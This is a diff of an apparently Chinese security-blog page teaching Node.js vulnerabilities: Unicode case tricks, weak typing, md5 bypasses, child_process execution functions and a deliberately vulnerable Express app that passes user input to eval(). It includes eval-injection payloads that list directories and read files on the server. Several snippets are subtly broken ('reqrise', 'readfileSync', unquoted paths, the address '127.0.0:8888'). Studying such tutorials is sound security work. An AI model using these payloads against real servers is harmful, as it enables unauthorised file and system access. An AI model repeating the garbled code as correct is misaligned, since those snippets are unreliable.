@@ -11,7 +11,7 @@
   <meta itemprop="name" content="nodejs漏洞学习">
   <meta itemprop="datePublished" content="2024-08-15T09:31:01+08:00">
   <meta itemprop="dateModified" content="2024-08-15T09:31:01+08:00">
-  <meta itemprop="wordCount" content="388">
+  <meta itemprop="wordCount" content="359">
   <meta itemprop="keywords" content="代码审计,Nodejs安全"><meta property="og:url" content="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/nodejs%E5%AE%89%E5%85%A8/17/">
   <meta property="og:site_name" content="东隅 Blog">
   <meta property="og:title" content="nodejs漏洞学习">
@@ -37,7 +37,7 @@
     "mainEntityOfPage": {
       "@type": "WebPage",
       "@id": "https:\/\/dongyu29.github.io\/posts\/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6\/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1\/nodejs%E5%AE%89%E5%85%A8\/17\/"
-    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "代码审计, nodejs安全","wordcount":  388 ,
+    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "代码审计, nodejs安全","wordcount":  359 ,
     "url": "https:\/\/dongyu29.github.io\/posts\/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6\/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1\/nodejs%E5%AE%89%E5%85%A8\/17\/","datePublished": "2024-08-15T09:31:01+08:00","dateModified": "2024-08-15T09:31:01+08:00","publisher": {
       "@type": "Organization",
       "name": "","logo": "https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"},"author": {
@@ -144,7 +144,7 @@
   <article class="page single">
     <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid x" aria-hidden="true"></i></span><span>Nodejs漏洞学习</span>
       </h1></div><div class="post-meta">
-      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category" title="Category - 代码审计"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 代码审计</a></span></div><div class="post-meta-line"><span title="published on 2024-08-15 09:31:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-08-15">2024-08-15</time></span>&nbsp;<span title="388 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 400 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>2 minutes</span>&nbsp;</div>
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category" title="Category - 代码审计"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 代码审计</a></span></div><div class="post-meta-line"><span title="published on 2024-08-15 09:31:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-08-15">2024-08-15</time></span>&nbsp;<span title="359 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 400 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>2 minutes</span>&nbsp;</div>
     </div><div class="details toc" id="toc-static" data-kept="false">
         <div class="details-summary toc-title">
           <span>Contents</span>
@@ -152,18 +152,34 @@
         </div>
         <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
   <ul>
-    <li>
+    <li><a href="#大小写变换">大小写变换</a></li>
+    <li><a href="#弱类型">弱类型</a></li>
+    <li><a href="#变量拼接">变量拼接</a></li>
+    <li><a href="#es6模板字符串">ES6模板字符串</a></li>
+    <li><a href="#md5绕过">md5绕过</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#漏洞函数">漏洞函数</a>
       <ul>
         <li></li>
       </ul>
     </li>
   </ul>
+
+  <ul>
+    <li><a href="#rn注入">\r\n注入</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#字符拼接">字符拼接</a></li>
+  </ul>
 </nav></div>
-      </div><div class="content" id="content" data-end-flag="-----（完）-----"><h5 id="nodejs入门" class="heading-element"><span>0.0.0.1  nodejs入门</span>
+      </div><div class="content" id="content" data-end-flag="-----（完）-----"><h1 id="nodejs入门" class="heading-element"><span>nodejs入门</span>
   <a href="#nodejs%e5%85%a5%e9%97%a8" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><p>简单的说Node.js就是运行在服务端的JavaScript。</p>
+</h1><p>简单的说Node.js就是运行在服务端的JavaScript。</p>
 <p>Node.js是一个基于Chrome JavaScript运行时建立的一个平台。</p>
 <p>Node.js是一个事件驱动IO服务端JavaScript环境，基于Google的V8引擎,V8引擎执行Javascript的速度非常快，性能非常好。</p>
 <p>应用</p>
@@ -186,25 +202,25 @@
 </span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">response</span>.<span style="color:#58a1dd">end</span>(<span style="color:#a6be9d">&#39;Hello World\n&#39;</span>);
 </span></span><span style="display:flex;"><span>}).<span style="color:#58a1dd">listen</span>(<span style="color:#a6be9d">8888</span>);
 </span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">//终端打印如下信息
-</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">console</span>.<span style="color:#58a1dd">log</span>(<span style="color:#a6be9d">&#39;Server running at http://127.0.0:8888/&#39;</span>);</span></span></code></pre></div><h5 id="nodejs语言漏洞" class="heading-element"><span>0.0.0.2  nodejs语言漏洞</span>
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">console</span>.<span style="color:#58a1dd">log</span>(<span style="color:#a6be9d">&#39;Server running at http://127.0.0:8888/&#39;</span>);</span></span></code></pre></div><h1 id="nodejs语言漏洞" class="heading-element"><span>nodejs语言漏洞</span>
   <a href="#nodejs%e8%af%ad%e8%a8%80%e6%bc%8f%e6%b4%9e" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><h6 id="大小写变换" class="heading-element"><span>0.0.0.2.1  大小写变换</span>
+</h1><h2 id="大小写变换" class="heading-element"><span>大小写变换</span>
   <a href="#%e5%a4%a7%e5%b0%8f%e5%86%99%e5%8f%98%e6%8d%a2" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><pre tabindex="0"><code>toUpperCase():
+</h2><pre tabindex="0"><code>toUpperCase():
 ı  ==&gt;I
 ſ  ==&gt;S
 
 toLowerCase():
 İ  ==&gt;i
-K  ==&gt;k</code></pre><h6 id="弱类型" class="heading-element"><span>0.0.0.2.2  弱类型</span>
+K  ==&gt;k</code></pre><h2 id="弱类型" class="heading-element"><span>弱类型</span>
   <a href="#%e5%bc%b1%e7%b1%bb%e5%9e%8b" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><ul>
+</h2><ul>
 <li>与php相似的 数字与数字字符串比较的时候 数字型字符串会被转换之后 再比较</li>
 </ul>
 <pre tabindex="0"><code>console.log(1==&#39;1&#39;); //true
@@ -234,39 +250,39 @@ console.log([11,16]&lt;&#34;10&#34;); //false</code></pre><ul>
 <pre tabindex="0"><code>console.log(null==undefined) // 输出：true
 console.log(null===undefined) // 输出：false
 console.log(NaN==NaN)  // 输出：false
-console.log(NaN===NaN)  // 输出：false</code></pre><h6 id="变量拼接" class="heading-element"><span>0.0.0.2.3  变量拼接</span>
+console.log(NaN===NaN)  // 输出：false</code></pre><h2 id="变量拼接" class="heading-element"><span>变量拼接</span>
   <a href="#%e5%8f%98%e9%87%8f%e6%8b%bc%e6%8e%a5" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><pre tabindex="0"><code>console.log(5+[6,6]); //56,6
+</h2><pre tabindex="0"><code>console.log(5+[6,6]); //56,6
 console.log(&#34;5&#34;+6); //56
 console.log(&#34;5&#34;+[6,6]); //56,6
-console.log(&#34;5&#34;+[&#34;6&#34;,&#34;6&#34;]); //56,6</code></pre><h6 id="es6模板字符串" class="heading-element"><span>0.0.0.2.4  ES6模板字符串</span>
+console.log(&#34;5&#34;+[&#34;6&#34;,&#34;6&#34;]); //56,6</code></pre><h2 id="es6模板字符串" class="heading-element"><span>ES6模板字符串</span>
   <a href="#es6%e6%a8%a1%e6%9d%bf%e5%ad%97%e7%ac%a6%e4%b8%b2" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>我们可以使用反引号替代括号执行函数</p>
+</h2><p>我们可以使用反引号替代括号执行函数</p>
 <p>可以用反引号替代 单引号 双引号</p>
 <p>可以在反引号内插入变量，模板字符串是将字符串作为参数传入函数中，而参数是一个数组，所以数组遇到<code>${]</code> 字符串会被分割</p>
 <pre tabindex="0"><code>var aaaa = &#34;fake_s0u1&#34;;
 console.log(&#34;hello %s&#34;,aaaa);</code></pre><p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307281517244.webp" alt="image-20230728151712044" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307281517244.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307281517244.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307281517244.webp?size=large 2x" data-title="image-20230728151712044" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <pre tabindex="0"><code>var aaaa = &#34;fake_s0u1&#34;;
 console.log`hello${aaaa}world`;</code></pre><p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307281518541.webp" alt="image-20230728151844297" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307281518541.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307281518541.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307281518541.webp?size=large 2x" data-title="image-20230728151844297" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
-<h6 id="md5绕过" class="heading-element"><span>0.0.0.2.5  md5绕过</span>
+<h2 id="md5绕过" class="heading-element"><span>md5绕过</span>
   <a href="#md5%e7%bb%95%e8%bf%87" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><pre tabindex="0"><code>a &amp;&amp; b &amp;&amp; a.length===b.length &amp;&amp; a!==b &amp;&amp; md5(a+flag) === md5(b+flag)</code></pre><p>定义的对象会被解析成[object Object]</p>
+</h2><pre tabindex="0"><code>a &amp;&amp; b &amp;&amp; a.length===b.length &amp;&amp; a!==b &amp;&amp; md5(a+flag) === md5(b+flag)</code></pre><p>定义的对象会被解析成[object Object]</p>
 <p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307301146882.webp" alt="image-20230730114636674" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307301146882.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307301146882.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307301146882.webp?size=large 2x" data-title="image-20230730114636674" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
-<h5 id="代码注入" class="heading-element"><span>0.0.0.3  代码注入</span>
+<h1 id="代码注入" class="heading-element"><span>代码注入</span>
   <a href="#%e4%bb%a3%e7%a0%81%e6%b3%a8%e5%85%a5" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><h6 id="漏洞函数" class="heading-element"><span>0.0.0.3.1  漏洞函数</span>
+</h1><h2 id="漏洞函数" class="heading-element"><span>漏洞函数</span>
   <a href="#%e6%bc%8f%e6%b4%9e%e5%87%bd%e6%95%b0" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><pre tabindex="0"><code>process 的作用是提供当前 node.js 进程信息并对其进行控制。
+</h2><pre tabindex="0"><code>process 的作用是提供当前 node.js 进程信息并对其进行控制。
 
 spawn() 启动一个子进程 来执行命令 spawn(命令,{shell:true})
 
@@ -274,8 +290,11 @@ exec()：启动一个子进程来执行命令，与spawn()不同的是其接口�
 
 execFile() ：启动一个子进程来执行可执行文件。实际利用时，在第一个参数位置执行 shell 命令，类似 exec。
 
-fork()：与spawn()类似，不同点在于它创建Node的子进程只需指定要执行的JavaScript文件模块即可。用于执行 js 文件，实际利用中需要提前写入恶意文件</code></pre><p>######## eval()</p>
-<p>javascript 的 eval 作用就是计算某个字符串，并执行其中的 js 代码。</p>
+fork()：与spawn()类似，不同点在于它创建Node的子进程只需指定要执行的JavaScript文件模块即可。用于执行 js 文件，实际利用中需要提前写入恶意文件</code></pre><h4 id="eval" class="heading-element"><span>eval()</span>
+  <a href="#eval" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>javascript 的 eval 作用就是计算某个字符串，并执行其中的 js 代码。</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#ff636f">var</span> <span style="color:#58a1dd">express</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">require</span>(<span style="color:#a6be9d">&#34;express&#34;</span>);
 </span></span><span style="display:flex;"><span><span style="color:#ff636f">var</span> <span style="color:#58a1dd">app</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">express</span>();
 </span></span><span style="display:flex;"><span>
@@ -287,8 +306,11 @@ fork()：与spawn()类似，不同点在于它创建Node的子进程只需指定
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">app</span>.<span style="color:#58a1dd">listen</span>(<span style="color:#a6be9d">1234</span>);
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">console</span>.<span style="color:#58a1dd">log</span>(<span style="color:#a6be9d">&#39;Server runing at http://127.0.0.1:1234/&#39;</span>);</span></span></code></pre></div><p>我们可以看到 我们在上面的源码中 使用了eval函数</p>
 <p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307281540960.webp" alt="image-20230728154047574" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307281540960.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307281540960.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307281540960.webp?size=large 2x" data-title="image-20230728154047574" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
-<p>######### fs模块：可以用来读取文件以及查看目录</p>
-<p>require（‘fs’）</p>
+<h5 id="fs模块可以用来读取文件以及查看目录" class="heading-element"><span>fs模块：可以用来读取文件以及查看目录</span>
+  <a href="#fs%e6%a8%a1%e5%9d%97%e5%8f%af%e4%bb%a5%e7%94%a8%e6%9d%a5%e8%af%bb%e5%8f%96%e6%96%87%e4%bb%b6%e4%bb%a5%e5%8f%8a%e6%9f%a5%e7%9c%8b%e7%9b%ae%e5%bd%95" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>require（‘fs’）</p>
 <p>fs.readdirSync(path[, options])都可以用来查看目录
 例如：</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#ff636f">const</span> <span style="color:#58a1dd">fs</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">require</span>(<span style="color:#a6be9d">&#39;fs&#39;</span>)
@@ -303,8 +325,11 @@ fork()：与spawn()类似，不同点在于它创建Node的子进程只需指定
 <p>fs.readfileSync(1.txt)即可读取 。
 这里给出playload:</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#ff636f">?</span><span style="color:#58a1dd">eval</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">reqrise</span>(<span style="color:#a6be9d">&#39;fs&#39;</span>).<span style="color:#58a1dd">readdirSync</span>(.)  <span style="color:#58a1dd">查看当前目录</span>
-</span></span><span style="display:flex;"><span><span style="color:#ff636f">?</span><span style="color:#58a1dd">eval</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">require</span>(<span style="color:#a6be9d">&#39;fs&#39;</span>).<span style="color:#58a1dd">readfileSync</span>(<span style="color:#a6be9d">1.</span><span style="color:#58a1dd">txt</span>) <span style="color:#58a1dd">读取文件</span></span></span></code></pre></div><p>######### settimeout()</p>
-<p>settimeout(function,time)，该函数作用是两秒后执行函数，function 处为我们可控的参数。</p>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">?</span><span style="color:#58a1dd">eval</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">require</span>(<span style="color:#a6be9d">&#39;fs&#39;</span>).<span style="color:#58a1dd">readfileSync</span>(<span style="color:#a6be9d">1.</span><span style="color:#58a1dd">txt</span>) <span style="color:#58a1dd">读取文件</span></span></span></code></pre></div><h5 id="settimeout" class="heading-element"><span>settimeout()</span>
+  <a href="#settimeout" class="heading-mark">
